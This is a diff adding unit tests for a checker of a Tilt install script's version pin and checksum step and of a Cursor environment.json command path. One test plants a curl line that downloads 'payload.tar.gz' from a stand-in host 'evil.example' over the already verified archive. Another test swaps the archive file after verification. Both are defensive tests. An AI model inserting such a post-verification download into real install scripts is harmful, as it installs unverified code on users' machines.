@@ -14,7 +14,7 @@ from __future__ import annotations
 import unittest
 from pathlib import Path
 
-from check_tilt_pin import check_install_script
+from check_tilt_pin import check_environment_json, check_install_script
 
 GOOD = """\
 TILT_VERSION="0.37.7"
@@ -89,6 +89,41 @@ class CheckTiltPinTests(unittest.TestCase):
             '  echo "${TILT_SHA256}  ${archive}" | sha256sum -c -\n',
         )
         self.assertTrue(check_install_script(mutated))
+
+    def test_archive_reassigned_between_verify_and_extract_fails(self) -> None:
+        # A verified $archive is swapped for a different file before `tar`.
+        mutated = GOOD.replace(
+            '  echo "${TILT_SHA256}  ${archive}" | sha256sum -c -\n'
+            '  tar -xzf "$archive" -C "$tmp" tilt\n',
+            '  echo "${TILT_SHA256}  ${archive}" | sha256sum -c -\n'
+            '  archive="$tmp/swapped.tar.gz"\n'
+            '  tar -xzf "$archive" -C "$tmp" tilt\n',
+        )
+        self.assertTrue(check_install_script(mutated))
+
+    def test_archive_rewritten_between_verify_and_extract_fails(self) -> None:
+        # The verified file is overwritten in place before `tar`.
+        mutated = GOOD.replace(
+            '  echo "${TILT_SHA256}  ${archive}" | sha256sum -c -\n'
+            '  tar -xzf "$archive" -C "$tmp" tilt\n',
+            '  echo "${TILT_SHA256}  ${archive}" | sha256sum -c -\n'
+            '  curl -fsSL -o "$archive" "https://evil.example/payload.tar.gz"\n'
+            '  tar -xzf "$archive" -C "$tmp" tilt\n',
+        )
+        self.assertTrue(check_install_script(mutated))
+
+    def test_environment_json_absolute_path_passes(self) -> None:
+        good_env = '{ "command": "PATH=/usr/local/cargo/bin:$PATH /usr/local/bin/tilt up --stream" }'
+        self.assertEqual(check_environment_json(good_env), [])
+
+    def test_environment_json_bare_tilt_fails(self) -> None:
+        bad_env = '{ "command": "PATH=/usr/local/cargo/bin:$PATH tilt up --stream" }'
+        self.assertTrue(check_environment_json(bad_env))
+
+    def test_committed_environment_json_passes(self) -> None:
+        root = Path(__file__).resolve().parent.parent
+        text = (root / ".cursor/environment.json").read_text()
+        self.assertEqual(check_environment_json(text), [])
 
 
 if __name__ == "__main__":
